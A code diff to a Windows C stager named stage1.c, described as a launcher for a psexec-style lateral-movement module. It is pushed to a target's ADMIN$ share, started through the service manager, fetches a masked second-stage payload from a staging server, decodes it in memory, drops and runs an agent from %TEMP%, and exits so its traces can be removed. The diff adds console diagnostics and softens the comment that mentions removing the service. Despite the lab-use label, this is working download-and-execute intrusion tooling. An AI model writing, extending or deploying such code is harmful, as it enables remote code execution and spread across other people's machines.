@@ -1,12 +1,12 @@
 /*
  * stage1.c - Minimal WinHTTP stage1 launcher (authorized lab use only).
  *
- * The psexec lateral module pushes this compact binary to the target's ADMIN$
- * share and starts it via the SCM.  stage1 carries no beacon secret: its only
+ * Standalone launcher. The dedicated lateral-service host also compiles this
+ * worker code into its own binary. Stage1 carries no beacon secret: its only
  * credential is the unguessable staging identifier on its command line.  It
  * fetches the masked stage2 payload from the RMM staging endpoint, decodes it
  * in memory, writes the agent to disk, launches it, and exits so the caller
- * can remove the service and this binary.
+ * can complete its deployment lifecycle.
  *
  * Build (cross-compile from Linux, authorized lab use only):
  *
@@ -29,6 +29,11 @@
  *   4. Write to %TEMP%\minimal-rmm-agent.exe (user-writable, no elevation)
  *   5. CreateProcessW detached: minimal-rmm-agent.exe --lateral-session <id>
  *   6. POST status back to staging endpoint
+ *
+ * Diagnostics: when started from a console (cmd.exe), stage1 attaches to the
+ * parent console and prints its progress and errors; SCM and Explorer
+ * launches stay silent. Exit codes: 0 = agent started, 1 = staging failure
+ * (status posted to the server), 2 = invalid arguments or base URL.
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -64,6 +69,30 @@
 /* Maximum payload size accepted: 32 MiB */
 #define MAX_PAYLOAD_BYTES (32u * 1024u * 1024u)
 
+/* Optional console diagnostics. stage1 is a GUI-subsystem binary, so a manual
+ * run from cmd.exe gives it no console and every failure used to look like
+ * "nothing happened". Attach to the parent console when one exists (manual
+ * runs from a terminal); SCM (psexec) and Explorer launches stay silent. */
+static HANDLE g_console = INVALID_HANDLE_VALUE;
+
+static void consoleAttach(void) {
+    if (AttachConsole(ATTACH_PARENT_PROCESS))
+        g_console = CreateFileW(L"CONOUT$", GENERIC_WRITE, FILE_SHARE_WRITE,
+                                NULL, OPEN_EXISTING, 0, NULL);
+}
+
+static void consolePrint(const char *msg) {
+    if (g_console == INVALID_HANDLE_VALUE) return;
+    int n = lstrlenA(msg);
+    if (n > 500) n = 500;
+    char line[512];
+    CopyMemory(line, msg, n);
+    line[n] = '\r';
+    line[n + 1] = '\n';
+    DWORD written;
+    WriteFile(g_console, line, (DWORD)(n + 2), &written, NULL);
+}
+
 /* Staging-id alphabet check: same as the Go stagingTokenPattern */
 static int validStagingChar(wchar_t c) {
     return (c >= L'0' && c <= L'9') ||
@@ -79,16 +108,6 @@ static int validStagingID(const wchar_t *id) {
         n++;
     }
     return n >= 8 && n <= 128;
-}
-
-/* Convert narrow UTF-8/ASCII string to newly-HeapAlloc'd wide string. */
-static wchar_t *widen(const char *s) {
-    int n = MultiByteToWideChar(CP_ACP, 0, s, -1, NULL, 0);
-    if (n <= 0) return NULL;
-    wchar_t *w = (wchar_t *)HeapAlloc(GetProcessHeap(), 0, n * sizeof(wchar_t));
-    if (!w) return NULL;
-    MultiByteToWideChar(CP_ACP, 0, s, -1, w, n);
-    return w;
 }
 
 /* Convert wide string to newly-HeapAlloc'd narrow string (ASCII-safe). */
@@ -357,7 +376,7 @@ static const char *doStage(HINTERNET hSession,
     if (!writeOk || written != payloadLen) return "failed to write agent binary (incomplete)";
 
     /* 5. Launch detached: minimal-rmm-agent.exe --lateral-session <session_id> */
-    wchar_t cmdLine[MAX_PATH + 64];
+    wchar_t cmdLine[MAX_PATH + 160];
     lstrcpyW(cmdLine, L"\"");
     lstrcatW(cmdLine, agentPath);
     lstrcatW(cmdLine, L"\" --lateral-session ");
@@ -379,23 +398,32 @@ static const char *doStage(HINTERNET hSession,
     if (!launched) return "failed to start agent process";
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
+    {
+        char *pathText = narrow(agentPath);
+        if (pathText) {
+            consolePrint("stage1: agent started");
+            consolePrint(pathText);
+            HeapFree(GetProcessHeap(), 0, pathText);
+        }
+    }
     return NULL; /* success */
 }
 
 /* -------------------------------------------------------------------------
  * Entry point
  * ------------------------------------------------------------------------- */
-int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
-                   LPSTR lpCmdLine, int nShowCmd) {
-    (void)hInst; (void)hPrev; (void)lpCmdLine; (void)nShowCmd;
+static int runLauncher(void) {
+    consoleAttach();
 
     const wchar_t *baseURL = BASE_URL;
-    if (!baseURL || baseURL[0] == L'\0') return 2;
 
     /* Parse command-line arguments */
     int argc;
     LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-    if (!argv) return 2;
+    if (!argv) {
+        consolePrint("stage1: command line parsing failed");
+        return 2;
+    }
 
     wchar_t stageID[256]   = {0};
     wchar_t sessionID[256] = {0};
@@ -412,13 +440,24 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
     LocalFree(argv);
 
     if (customURL[0] != L'\0') baseURL = customURL;
-    if (!validStagingID(stageID) || !validStagingID(sessionID)) return 2;
+    if (!baseURL || baseURL[0] == L'\0') {
+        consolePrint("stage1: no base URL embedded; rebuild through the RMM server");
+        return 2;
+    }
+
+    if (!validStagingID(stageID) || !validStagingID(sessionID)) {
+        consolePrint("stage1: missing or invalid --stage/--session arguments");
+        return 2;
+    }
 
     /* Crack base URL into host + path components */
     wchar_t host[512], basePath[1024];
     INTERNET_PORT port;
     DWORD secFlag;
-    if (!crackURL(baseURL, host, 512, basePath, 1024, &port, &secFlag)) return 2;
+    if (!crackURL(baseURL, host, 512, basePath, 1024, &port, &secFlag)) {
+        consolePrint("stage1: invalid base URL");
+        return 2;
+    }
 
     /* Build staging path: basePath + /tools/stage/ + stageID */
     wchar_t stagePath[1280];
@@ -436,7 +475,18 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS,
         0);
-    if (!hSession) return 1;
+    if (!hSession) {
+        consolePrint("stage1: WinHTTP initialization failed");
+        return 1;
+    }
+
+    {
+        char *urlText = narrow(baseURL);
+        if (urlText) {
+            consolePrint(urlText);
+            HeapFree(GetProcessHeap(), 0, urlText);
+        }
+    }
 
     const char *err = doStage(hSession, host, port, secFlag,
                                stagePath, stageID, sessionID);
@@ -444,10 +494,20 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
     if (err) {
         lstrcpyA(statusMsg, "stage1 failed: ");
         lstrcatA(statusMsg, err);
+        consolePrint(statusMsg);
     } else {
         lstrcpyA(statusMsg, "stage1 ok: agent installed and started");
+        consolePrint(statusMsg);
     }
     reportStatus(hSession, host, port, secFlag, stagePath, statusMsg);
     WinHttpCloseHandle(hSession);
     return err ? 1 : 0;
 }
+
+
+#ifndef STAGE1_EMBEDDED
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd) {
+    (void)hInst; (void)hPrev; (void)lpCmdLine; (void)nShowCmd;
+    return runLauncher();
+}
+#endif
